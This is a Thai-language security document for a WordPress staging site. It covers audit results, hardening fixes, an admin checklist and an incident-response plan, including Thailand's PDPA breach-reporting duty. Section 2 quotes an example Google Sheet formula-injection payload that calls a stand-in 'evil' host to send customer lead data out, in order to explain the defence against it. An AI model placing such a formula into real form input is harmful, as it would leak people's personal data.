# SECURITY — ความปลอดภัยของเว็บ HRI DeOne และแผนรับมือเหตุ

> ตรวจครั้งแรก 1 พ.ย. 2569 (staging `new.hrideone.com`, WordPress 7.1.4, theme 0.16.0 / plugin 0.19.0 → แก้ใน 0.20.0)
> ตรวจจากโค้ดใน repo + เปิดเว็บจากภายนอก (ไม่มีรหัสเข้า wp-admin / DirectAdmin) — ส่วนที่ต้องดูในหลังบ้านเขียนเป็นเช็กลิสต์ให้คนที่มีรหัสทำ

## 1. สรุป

| ชั้น | สถานะ | หมายเหตุ |
| --- | --- | --- |
| โค้ดของเรา (hri-core, hri-theme) | 🟢 ดี | ทุกช่องรับข้อมูล sanitize, ทุกจุดแสดงผล escape, ทุกปุ่มในหลังบ้านเช็ก nonce + สิทธิ์, SQL ใช้ `prepare()`, ไม่มี REST endpoint ของเราเอง, key/secret อยู่ใน `wp-config.php` ไม่อยู่ใน repo/ฐานข้อมูล · สแกนด้วย WordPress Coding Standards (Security sniffs) ไม่เจอจุดที่ใช้โจมตีได้ |
| ฟอร์ม Lead | 🟢 ดี | honeypot + จำกัด 5 ครั้ง/10 นาที + Turnstile (เมื่อใส่ key) · 0.20.0 กันสูตรใน Google Sheet + จำกัดคนเห็น Lead |
| โฮสต์ Ruk-com | 🟢 ค่อนข้างดี | มีชั้นกรองหน้าเว็บบล็อก `xmlrpc.php`, `readme.html`, `.env`, `.git`, `debug.log`, การเปิดดูรายการไฟล์ · HTTPS บังคับ · ⚠️ ACME ปิด → ใบรับรองหมด **7 ม.ค. 2570** ถ้าไม่ต่ออัตโนมัติ |
| การตั้งค่า WordPress บน staging | 🟡 ต้องทำเพิ่ม | ปลั๊กอินที่ Softaculous ติดมา (OneMCP เปิดสิทธิ์เขียน), ยังไม่มี 2FA, ยังไม่รู้ว่ามี backup นอกเครื่องหรือไม่, cron อาจไม่ทำงาน (ข้อ 3) |

**เพียงพอไหม**: สำหรับเว็บองค์กร/ขายคอร์สที่ไม่มีระบบสมาชิกหรือชำระเงิน — **เพียงพอ เมื่อทำเช็กลิสต์ข้อ 3 ครบ** ไม่ต้องซื้อปลั๊กอินความปลอดภัยแบบเสียเงิน ความเสี่ยงหลักของ WordPress ไม่ได้อยู่ที่โค้ดที่เราเขียน แต่อยู่ที่ (1) รหัสผ่านแอดมินหลุด (2) ปลั๊กอินภายนอกที่ไม่อัปเดต (3) ไม่มี backup ตอนเกิดเหตุ

## 2. แก้ในโค้ดแล้ว (plugin 0.20.0, `inc/security.php` + `inc/leads.php`)

1. **ปิดตัวแก้ไฟล์ PHP ใน wp-admin** (`DISALLOW_FILE_EDIT`) — ถ้ารหัสแอดมินหลุด คนร้ายฝังโค้ดผ่านเมนู Theme/Plugin File Editor ไม่ได้
2. **ไม่เปิดเผยชื่อผู้ใช้ที่ใช้ล็อกอิน** — ก่อนแก้ `/wp-json/wp/v2/users` และ `/?author=1` บอกชื่อล็อกอินแอดมินให้ทุกคนเห็น (ครึ่งหนึ่งของสิ่งที่คนเดารหัสต้องรู้) · ตอนนี้คนที่ไม่ได้ล็อกอินได้ 404 · ตัดผู้เขียนออกจาก oEmbed และ sitemap ผู้ใช้ · หน้าแก้ไขบทความ (ล็อกอินแล้ว) ยังใช้ได้ปกติ
3. **Security headers** ทุกหน้า: `X-Content-Type-Options`, `X-Frame-Options` (กันฝังเว็บใน iframe หลอกกด), `Referrer-Policy`, `Permissions-Policy`
4. **HSTS แบบเปิดเอง** — ใส่ `define( 'HRI_HSTS', true );` ใน `wp-config.php` **หลังจาก** ยืนยันว่า SSL ต่ออายุอัตโนมัติได้แล้วเท่านั้น (ถ้าใบรับรองหมดตอนเปิด HSTS ผู้เข้าชมจะกดข้ามคำเตือนไม่ได้ = เว็บล่ม)
5. **Lead (ข้อมูลส่วนบุคคล)**: เดิมผู้ใช้ระดับ Author/Contributor เห็นรายชื่อ Lead ได้ → ตอนนี้เฉพาะ Editor และ Administrator
6. **กันสูตรใน Google Sheet** — ถ้าผู้กรอกใส่ชื่อเป็น `=IMPORTXML("https://evil…"&A1:K999)` Sheet จะรันสูตรแล้วส่งข้อมูลลูกค้าทั้งชีตออกไปได้ · ตอนนี้ค่าที่ขึ้นต้น `= + - @` ถูกเติม `'` นำหน้า (Sheet ซ่อนเครื่องหมายนี้ และเบอร์ `+66…` ก็แสดงถูกด้วย)

## 3. เช็กลิสต์ที่ต้องทำในหลังบ้าน (คนที่มีรหัส)

ก่อนเปิดเว็บจริง (ทำบน staging ได้เลย แล้วทำซ้ำบน production):

- [ ] **ปิดและลบ OneMCP** (Plugins → Deactivate → Delete) — ดูเหตุผลในเธรดประเมิน OneMCP · และลบปลั๊กอินที่ไม่ใช้ทั้งหมด (CookieAdmin/CookieAdmin Pro ที่ปิดไว้, ตัวอื่นที่ Softaculous ติดมา) + ธีม Twenty* ที่ไม่ใช้ เหลือไว้ 1 ตัวพอ — ปลั๊กอินที่ปิดอยู่ก็ยังมีไฟล์ PHP ที่ถูกเรียกตรงได้
- [ ] **Users**: มีแอดมินเท่าที่จำเป็น · คนทำเนื้อหาใช้ role Editor ไม่ใช่ Administrator · รหัสผ่านยาว ≥ 16 ตัว จาก password manager · ไม่ใช้รหัสซ้ำกับ DirectAdmin/อีเมล
- [ ] **2FA ให้แอดมินทุกคน** — ปลั๊กอินฟรี "Two Factor" (ทีม WordPress.org) ใช้แอป Authenticator · Loginizer ที่ติดมาจำกัดการเดารหัสอยู่แล้ว (เก็บไว้ได้)
- [ ] **Users → Profile → Application Passwords**: ลบทั้งหมดที่ไม่ได้ใช้ (รหัสชนิดนี้ข้าม 2FA ได้)
- [ ] **อัปเดตอัตโนมัติ**: Dashboard → Updates เปิด auto-update ของ WordPress core (รวม major) · Plugins → "Enable auto-updates" ทุกตัวที่มาจาก wordpress.org (Polylang, The SEO Framework, Loginizer, Two Factor) · hri-core/hri-theme อัปเดตผ่านเรา
- [ ] **ตรวจ cron**: Tools → Site Health ถ้าขึ้น "scheduled event has failed / is late" หรือ "loopback request failed" แปลว่า wp-cron ไม่ทำงาน (ชั้นกรองของโฮสต์บล็อก `wp-cron.php` จากภายนอก) → auto-update จะไม่รัน → ตั้ง Cron Job ใน DirectAdmin ทุก 15 นาที: `php -q /home/<user>/domains/<โดเมน>/public_html/wp-cron.php` แล้วใส่ `define( 'DISABLE_WP_CRON', true );`
- [ ] **Backup นอกเครื่อง** — ถาม Ruk-com ว่าสำรองอัตโนมัติกี่วัน/เก็บกี่ชุด/กู้คืนเองได้ไหม · และเพิ่มสำรองของเราเอง (DirectAdmin → Create/Restore Backups ส่งไป FTP อื่น หรือ UpdraftPlus ฟรี → Google Drive) สัปดาห์ละครั้ง เก็บ ≥ 4 สัปดาห์ · **ทดลองกู้คืนบน staging 1 ครั้ง** ถึงจะนับว่ามี backup
- [ ] **SSL**: ขอ Ruk-com เปิด ACME / ต่ออายุ wildcard อัตโนมัติ (หมด 7 ม.ค. 2570) · ตั้งเตือนในปฏิทิน 14 วันก่อนหมด · ต่อได้อัตโนมัติแล้วค่อยเปิด `HRI_HSTS`
- [ ] **wp-config.php**: `WP_DEBUG` = false บน production · สิทธิ์ไฟล์ 600/640 (File Manager) · salts สร้างใหม่ตอนย้ายขึ้น production (https://api.wordpress.org/secret-key/1.1/salt/)
- [ ] **บัญชี DirectAdmin / FTP**: เปิด 2FA ของ DirectAdmin (ถ้ามี) · บัญชี FTP สำหรับ deploy จำกัดโฟลเดอร์ `wp-content` และใช้ FTPS เท่านั้น
- [ ] **ถาม Ruk-com**: มีสแกนมัลแวร์ (Imunify360/ClamAV) ไหม แจ้งเตือนทางไหน · มี WAF (ModSecurity) ไหม · เก็บ access log กี่วัน
- [ ] **Google Search Console**: ยืนยันเจ้าของเว็บ production → Google แจ้งทางอีเมลเมื่อพบว่าเว็บถูกแฮ็ก/มีมัลแวร์
- [ ] (ถ้าอยากได้) แจ้งเตือนช่องโหว่ปลั๊กอินฟรี: Patchstack หรือ WPScan แบบฟรี

ประจำ:
- ทุกเดือน: ดู Plugins ว่าทุกตัวอัปเดตแล้ว · Users ไม่มีบัญชีแปลก · Site Health ไม่มีข้อแดง
- ทุก 3 เดือน: ลองกู้ backup · ลบ Lead ที่เกินระยะเวลาเก็บตามนโยบาย PDPA ของบริษัท

## 4. ถ้าเจอมัลแวร์ ไวรัส หรือช่องโหว่ — ทำอย่างไร

### 4.1 สัญญาณที่บอกว่าน่าจะโดน
- เว็บเด้งไปเว็บพนัน/ยา โดยเฉพาะเมื่อเปิดจากมือถือหรือจากผล Google (คนร้ายมักซ่อนจากแอดมินที่ล็อกอินอยู่)
- Google แสดง "เว็บไซต์นี้อาจถูกแฮ็ก" หรือ Search Console ส่งอีเมลเตือน / ผลค้นหามีหน้าภาษาแปลก ๆ ของโดเมนเรา
- มีผู้ใช้ Administrator ที่ไม่รู้จัก, มีปลั๊กอินที่ไม่ได้ติดตั้ง, หน้าแรกเปลี่ยน
- Ruk-com แจ้งเตือนมัลแวร์ / บัญชีถูกระงับ / ส่งอีเมลขยะออกจากโฮสต์
- มีไฟล์ `.php` ใน `wp-content/uploads/` (ปกติต้องไม่มีเลย)

### 4.2 ขั้นตอน (ตามลำดับ)
1. **หยุดความเสียหาย (ชั่วโมงแรก)** — แจ้ง Ruk-com ให้ระงับเว็บชั่วคราวหรือเปิดโหมดปิดปรับปรุง · **อย่าเพิ่งลบไฟล์** (ต้องใช้เป็นหลักฐานหาว่าเข้ามาทางไหน) · ขอ Ruk-com เก็บ access log ช่วงนั้นไว้
2. **เปลี่ยนรหัสทุกอย่าง จากเครื่องที่ไม่ติดไวรัส** — WordPress ทุกบัญชี, DirectAdmin, FTP, ฐานข้อมูล (แล้วแก้ใน `wp-config.php`), อีเมลของแอดมิน · ลบ Application Passwords ทั้งหมด · สร้าง salts ใหม่ (ทุกคนหลุดล็อกอิน) · ลบผู้ใช้ที่ไม่รู้จัก
3. **หาขอบเขต** — ขอผลสแกนมัลแวร์จาก Ruk-com · ดูวันที่ไฟล์ถูกแก้ล่าสุดใน File Manager · ดูว่าคนร้ายเข้ามาเมื่อไหร่ (จาก log) → ใช้เลือก backup ที่ "ก่อนวันนั้น"
4. **ทำความสะอาด — ใช้วิธีลงใหม่ ไม่ใช่ไล่ลบไฟล์ทีละตัว**
   - WordPress core: ลงใหม่ทับ (Dashboard → Updates → Re-install หรือ Softaculous)
   - **hri-theme / hri-core: ใช้ zip ที่สร้างจาก GitHub ใหม่** (`scripts/package-staging.sh`) — repo คือต้นฉบับที่สะอาด ไม่ต้องสงสัยว่าไฟล์บนโฮสต์ถูกแก้หรือไม่
   - ปลั๊กอินภายนอก: ลบโฟลเดอร์ทิ้งแล้วติดตั้งใหม่จาก wordpress.org
   - `uploads/`: ลบไฟล์ที่ไม่ใช่รูป/PDF/วิดีโอ (โดยเฉพาะ `.php`, `.phtml`, `.htaccess` แปลก ๆ)
   - ฐานข้อมูล: ตรวจ `siteurl`/`home` ใน Settings, ผู้ใช้, และเนื้อหาที่มี `<script>` แปลก ๆ · ถ้ามี backup สะอาด กู้ฐานข้อมูลจาก backup แล้วนำ Lead ที่เข้ามาหลังจากนั้นกลับมาจาก Google Sheet
   - หรือกู้ทั้งเว็บจาก backup ก่อนวันที่โดน แล้วทำข้อ 2 ซ้ำ + อัปเดตทุกอย่างทันที (ไม่งั้นโดนซ้ำทางเดิม)
5. **ปิดช่องที่เข้ามา** — อัปเดต/ลบปลั๊กอินที่มีช่องโหว่ · เปิด 2FA · ถ้าเป็นช่องโหว่ในโค้ดของเรา แก้ใน repo → PR → zip ใหม่
6. **เปลี่ยน secret ที่อยู่ใน wp-config.php** — Turnstile secret, `HRI_LEAD_WEBHOOK_TOKEN` (และ TOKEN ใน Apps Script), `HRI_TRANSLATE_API_KEY` (เพิกถอนที่ console.anthropic.com), IndexNow key
7. **ตรวจว่าสะอาดแล้ว** — Ruk-com สแกนซ้ำ · เปิดเว็บจากมือถือที่ไม่ได้ล็อกอิน + จากผล Google · Search Console → Security issues → ขอให้ตรวจสอบอีกครั้ง
8. **PDPA — ถ้าข้อมูล Lead อาจหลุด** (ชื่อ เบอร์ อีเมล บริษัท) บริษัทในฐานะผู้ควบคุมข้อมูลต้อง **แจ้งสำนักงานคณะกรรมการคุ้มครองข้อมูลส่วนบุคคล (สคส.) ภายใน 72 ชั่วโมง** นับจากรู้เหตุ (ม.37(4)) เว้นแต่ไม่มีความเสี่ยงต่อสิทธิของเจ้าของข้อมูล และแจ้งเจ้าของข้อมูลด้วยถ้าความเสี่ยงสูง → แจ้งผู้รับผิดชอบ PDPA/ฝ่ายกฎหมายของบริษัทตั้งแต่ข้อ 1
9. **บันทึกเหตุการณ์** — เกิดอะไร เมื่อไหร่ เข้ามาทางไหน แก้อย่างไร → เพิ่มในไฟล์นี้

### 4.3 ถ้าเจอ "ช่องโหว่" (ยังไม่โดน)
- **ในปลั๊กอินภายนอก** (ได้อีเมลจาก Patchstack/WPScan/ข่าว): มีเวอร์ชันแก้แล้ว → อัปเดตทันที · ยังไม่มี → ปิดปลั๊กอินนั้นจนกว่าจะมี · แล้วดูสัญญาณข้อ 4.1 ย้อนหลังว่าโดนไปแล้วหรือยัง
- **ในโค้ดของเรา**: แจ้งในโปรเจกต์ → แก้ใน repo + ทดสอบ → zip ใหม่อัปโหลด · ถ้ารุนแรงและแก้ไม่ทัน ปิดฟีเจอร์นั้นชั่วคราว
- **ใน WordPress core**: auto-update จะลงให้ภายใน ~12 ชม. (ถ้า cron ทำงาน) · ตรวจที่ Dashboard → Updates
